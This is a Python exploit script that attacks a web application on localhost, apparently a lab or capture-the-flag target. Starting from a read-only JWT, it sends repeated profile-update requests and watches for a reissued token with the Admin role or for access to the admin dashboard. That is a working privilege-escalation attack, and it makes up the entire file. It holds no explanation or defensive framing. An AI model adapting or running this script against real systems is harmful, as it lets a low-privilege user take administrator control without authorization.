# exploit/exploit.py
import requests
import json
import sys
import time
import jwt as pyjwt # Rename to avoid conflict with 'jwt' module

# --- Configuration ---
BASE_URL = "http://localhost:5000"
ATTEMPTS = 100  # Number of attempts to make
SLEEP_TIME = 0.05 # Small delay between attempts, adjust for your system/timing

# --- Input Validation ---
if len(sys.argv) < 2:
    print("Usage: python exploit.py <YOUR_READONLY_JWT>")
    print("First, log in as 'readonly:readpass' to get a Read-Only JWT.")
    sys.exit(1)

READONLY_JWT = sys.argv[1]

# --- Helper Functions ---
def make_request(method, url, headers, data=None):
    try:
        if data:
            response = requests.request(method, url, headers=headers, data=json.dumps(data), timeout=5)
        else:
            response = requests.request(method, url, headers=headers, timeout=5)
        return response
    except requests.exceptions.RequestException as e:
        print(f"  [ERROR] Request to {url} failed: {e}")
        return None

def decode_jwt_claims(token):
    try:
        # We don't verify signature here as we just want to inspect the claims
        # This is safe for inspecting *our own* token during an exploit
        return pyjwt.decode(token, options={"verify_signature": False})
    except Exception as e:
        # print(f"  [ERROR] Could not decode JWT: {e}")
        return {}

def login_readonly():
    login_data = {"username": "readonly", "password": "readpass"}
    response = make_request("POST", f"{BASE_URL}/login", {"Content-Type": "application/json"}, login_data)
    if response and response.status_code == 200:
        return response.json().get('token')
    return None

# --- Exploit Logic ---
def run_exploit(initial_jwt):
    current_jwt = initial_jwt
    print(f"Starting privilege escalation attempt for readonly user.")
    print(f"Initial JWT (first 30 chars): {current_jwt[:30]}...")
    print(f"Will attempt {ATTEMPTS} times with a {SLEEP_TIME}s delay between checks.")

    for i in range(1, ATTEMPTS + 1):
        print(f"\n--- Attempt {i}/{ATTEMPTS} ---")

        headers_with_current_jwt = {
            "Authorization": f"Bearer {current_jwt}",
            "Content-Type": "application/json"
        }

        # 1. Send update profile request
        new_email = f"readonly_updated_{time.time()}@example.com"
        update_data = {"email": new_email}
        
        update_response = make_request("POST", f"{BASE_URL}/profile", headers_with_current_jwt, update_data)

        if not update_response:
            print("  Skipping to next attempt due to request error.")
            time.sleep(SLEEP_TIME)
            continue

        print(f"  Profile update response: {update_response.status_code}")
        update_response_json = update_response.json()
        
        # Check if a new JWT was issued by the profile update endpoint
        if 'new_jwt' in update_response_json:
            potential_new_jwt = update_response_json['new_jwt']
            decoded_new_jwt = decode_jwt_claims(potential_new_jwt)
            db_role_reported = update_response_json.get('current_db_role', 'N/A')

            print(f"  --> Received NEW JWT from profile update. Reported DB Role: {db_role_reported}")
            print(f"  --> New JWT Claims (Role): {decoded_new_jwt.get('role', 'N/A')}")
            
            # If the new JWT actually has 'Admin' role, we've succeeded
            if decoded_new_jwt.get('role') == 'Admin':
                current_jwt = potential_new_jwt # Update to the Admin JWT
                print("\n!!! PRIVILEGE ESCALATION SUCCESSFUL !!!")
                print(f"Obtained Admin JWT: {current_jwt}")
                print(f"Admin JWT Claims: {decoded_new_jwt}")
                return current_jwt # Exploit succeeded

            current_jwt = potential_new_jwt # Use the new JWT for subsequent requests
            headers_with_current_jwt["Authorization"] = f"Bearer {current_jwt}"
        else:
            # If no new JWT was issued, verify the current JWT's claims
            decoded_current_jwt = decode_jwt_claims(current_jwt)
            # print(f"  Current JWT Claims (Role): {decoded_current_jwt.get('role', 'N/A')}")
            if decoded_current_jwt.get('role') == 'Admin':
                print("\n!!! PRIVILEGE ESCALATION SUCCESSFUL (old JWT became Admin) !!!")
                print(f"Obtained Admin JWT: {current_jwt}")
                print(f"Admin JWT Claims: {decoded_current_jwt}")
                return current_jwt # Exploit succeeded

        # 2. Immediately check admin dashboard with the current (potentially new) JWT
        admin_response = make_request("GET", f"{BASE_URL}/admin/dashboard", headers_with_current_jwt)

        if not admin_response:
            print("  Skipping to next attempt due to request error during Admin check.")
            time.sleep(SLEEP_TIME)
            continue

        print(f"  Admin dashboard check response: {admin_response.status_code}")
        admin_response_json = admin_response.json()

        if admin_response.status_code == 200 and "Admin Dashboard" in admin_response_json.get('message', ''):
            print("\n!!! PRIVILEGE ESCALATION SUCCESSFUL (Admin dashboard accessible) !!!")
            print(f"JWT that worked: {current_jwt}")
            print(f"JWT Claims: {decode_jwt_claims(current_jwt)}")
            return current_jwt # Exploit succeeded

        time.sleep(SLEEP_TIME)

    print("\nExploit did not succeed within the given attempts. Try again or adjust timing/sleep_time.")
    return None

if __name__ == "__main__":
    initial_readonly_jwt = READONLY_JWT
    
    # You could add an option here to auto-login if the JWT isn't provided
    # if not initial_readonly_jwt:
    #     print("Attempting to auto-login as readonly user...")
    #     initial_readonly_jwt = login_readonly()
    #     if not initial_readonly_jwt:
    #         print("Failed to auto-login. Please provide a valid Read-Only JWT.")
    #         sys.exit(1)
    #     else:
    #         print("Auto-login successful.")

    if initial_readonly_jwt:
        admin_jwt = run_exploit(initial_readonly_jwt)
        if admin_jwt:
            print("\nVerification: Trying to access admin dashboard with the obtained JWT.")
            final_headers = {"Authorization": f"Bearer {admin_jwt}"}
            verify_response = make_request("GET", f"{BASE_URL}/admin/dashboard", final_headers)
            if verify_response and verify_response.status_code == 200:
                print("Verification successful! Admin access confirmed.")
                print(verify_response.json())
            else:
                print("Verification failed. Admin access not confirmed.")
                print(verify_response.json() if verify_response else "No response.")
        sys.exit(0 if admin_jwt else 1)
    else:
        print("No Read-Only JWT provided or obtained. Exiting.")
        sys.exit(1)